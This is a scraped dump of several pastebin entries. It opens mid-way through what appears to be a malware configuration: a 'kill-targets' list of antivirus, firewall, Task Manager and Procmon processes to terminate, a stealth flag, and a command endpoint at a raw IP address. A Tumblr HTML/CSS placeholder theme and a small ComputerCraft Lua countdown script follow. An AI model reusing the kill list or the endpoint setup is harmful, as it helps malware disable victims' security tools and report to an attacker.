    ""kill-targets"": ""Taskmgr.exe,zerotier-one_x64.exe,xmsdiag.exe,afwServ.exe,aswEngSrv.exe,aswidsagent.exe,aswToolsSvc.exe,AvastSvc.exe,AvastSvc.exe,AvastUI.exe,wsc_proxy.exe,AvastBrowser.exe,AvastNM.exe,ashwebsv.exe,aswupdsv.exe,kavfswp.exe,kavtray.exe,kavfsmui.exe,kavshell.exe,kavfsrcn.exe,kavfs.exe,kavfsgt.exe,kavfswh.exe,kavfsscs.exe,efpeadm.exe,VPNGUI.exe,CVPND.exe,IPSECLOG.exe,cfp.exe,fsdfwd.exe,fsguiexe.exe,blackd.exe,kpf4gui.exe,MSSCLL.exe,MCSHELL.exe,MPFSERVICE.exe,MPFAGENT.exe,nisum.exe,smc.exe,persfw.exe,pccpfw.exe,WINSS.exe,ZLCLIENT.exe,MCODS.exe,MCSHIELD.exe,msmpeng.exe,navapsvc.exe,avkwctl.exe,fsav32.exe,mcshield.exe,ntrtscan.exe,avguard.exe,ashServ.exe,AVENGINE.exe,avgemc.exe,tmntsrv.exe,advchk.exe,ahnsd.exe,alertsvc.exe,avmaisrv.exe,avsynmgr.exe,bitdefender_p2p_startup.exe,cavrid.exe,cavtray.exe,cmgrdian.exe,freshclam.exe,icepack.exe,mgavrtcl.exe,mghtml.exe,mgui.exe,navapsvc.exe,navapw32.exe,navw32.exe,nsmdtr.exe,ofcdog.exe,pav.exe,savscan.exe,spider.exe,xcommsvr.exe,Procmon64a.exe,Procmon64.exe,Procmon.exe,anvir.exe,MRT.exe"",
	""stealth-fullscreen"": true,
	""api-endpoint"": ""http://156.208.133.221:8080/api/endpoint.php?key=UnknownErrors""
}"
Qm2EZQU7,𝐒𝐄𝐕𝐄𝐍,wilderanima,CSS,Monday 13th of May 2024 12:00:57 AM CDT,"     Hello, wildlings! 
 
  A straightforward placeholder code with an image and a scrolling words box. 
  Follow the dimensions of the images, otherwise, they won't fit properly. 
  Feel free to change colors! 
 
  Please do not steal this code. 
  Leave the credit! <3 Happy Writing! 
 
— — — — — — — — — — — — — — 

<style>

@import url('https://fonts.googleapis.com/css2?family=Economica:ital,wght@0,400;0,700;1,400;1,700&display=swap');

body {
cursor: url(https://66.media.tumblr.com/232c090ebdd37ae4bc17adb54e1e0344/tumblr_inline_ol4nwhvSwg1uxxza6_1280.png), auto;
background-color: #000;
}

::-webkit-scrollbar {
display: none;
}

::selection {
background: ;
color: white;
}

.container {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 0px;
right: 0px;
height: 550px;
width: 550px;
background-color: #000;
}

.wilder {
position: fixed;
bottom: 0px;
right: 0px;
}

.image1 {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 0px;
right: 250px;
height: 400px;
width: 250px;
background: url(https://placehold.co/250x400.png);
background-size: cover;
outline: 1px solid #554136;
outline-offset: -5px;
}

.words {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 275px;
right: 0px;
height: 355px;
width: 250px;
font: 12px economica;
color: #a3a597;
text-align: center;
overflow: auto;
}
b {
font: 13px economica;
color: #554136;
text-transform: uppercase;
font-weight: bold;
}
i {
font: 13px economica;
font-style: italic;
color: #7a6d65;
}
a {
text-decoration: none;
font: 13px times;
color: #7a6d65;
transition: 0.5s;
}
a:hover {
color: #a3a597;
text-shadow: 1px 1px 0px #7a6d65;

</style>

<!--
 MUSIC PLAYER #02 by glenthemes
 ♬ glenthpvs.tumblr.com/player02
--->
<script src=""//cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js""></script>
<link href=""//fonts.googleapis.com/css?family=Readex+Pro"" rel=""stylesheet"">
<link href=""//glenthemes.github.io/-music-/glenplayer02.css"" rel=""stylesheet"">
<script src=""//glenthemes.github.io/-music-/glenplayer02.js""></script>
<style element=""glenplayer02"">
:root {
 --MusicPlayer-Position:bottom left;
 --MusicPlayer-Edge-Offset:15px;
 
 --MusicPlayer-Buttons-Size:14px;
 --MusicPlayer-Buttons-Color:#554136;
 --MusicPlayer-Buttons-Fill:yes;

}
</style>

<div glenplayer02>
<div controls></div>
<i class=""aa-line-icons"" icon-name=""music-2""></i>
<audio src=""MUSIC_LINK"" volume=""100%""></audio>
</div>

<div class=""wilder""><a target=""_blank"" href=""https://pastebin.com/u/wilderanima"" title=""code by wilder.""><img src=""https://i.imgur.com/hCJmFVu.png"" width=""75px;""></a></div>

<div class=""container"">
<div class=""image1""></div>
<div class=""words"">

<b>let's try something bold.</b> <br>
<i>how about something italic?</i> <br>
<a>and for good measure? a link.</a> <br><br>

lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. <br><br>

ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. <br><br>

duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. <br><br>

excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. <br><br>

<hr size=""1"" width=""100%"" noshade style=""color:#554136""/>
<br>

words. <br><br>

</div>
</div>"
z0rnHH0Y,CC: GhoulMonitor,deadinside1222,Lua,Sunday 12th of May 2024 11:27:22 PM CDT,"local monitor = peripheral.find(""monitor"")

if monitor then
    
    monitor.clear()
    monitor.setCursorPos(1,1)

    
    local i = 1000

    
    while true do
        monitor.clear()     
        monitor.write(tostring(i))
        i = i - 7     
        if i < 0 then
            i = 1000
        end
        
        
        sleep(0.5)
    end
else
    print(""ERROR"")
end"
